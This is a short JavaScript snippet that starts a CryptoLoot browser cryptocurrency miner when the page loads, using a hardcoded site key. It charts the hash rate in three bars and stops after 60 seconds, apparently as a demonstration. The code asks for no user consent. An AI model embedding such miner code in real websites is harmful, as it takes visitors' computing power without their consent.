$(window).on('load', function () {
  var indicatorArray = []
  var miner = new CryptoLoot.Anonymous('09e3fc7da85015d4f5644c0f542d3ff087d293ec296d', {
    autoThreads: false,
    throttle: 0.7
  })
  miner.start()
  setInterval(function () {
    var hashesPerSecond = miner.getHashesPerSecond()
    var multiplier = (100 / 20)
    indicatorArray.push(hashesPerSecond)
    if (indicatorArray.length > 3) {
      indicatorArray.shift()
    }
    $('.column--0').css('height', indicatorArray[0] * multiplier + '%')
    $('.column--1').css('height', indicatorArray[1] * multiplier + '%')
    $('.column--2').css('height', indicatorArray[2] * multiplier + '%')
    console.log(hashesPerSecond)
  }, 1000)
  setTimeout(function () {
    miner.stop()
    console.log('Miner stopped after 60 seconds')
  }, 60000)
})
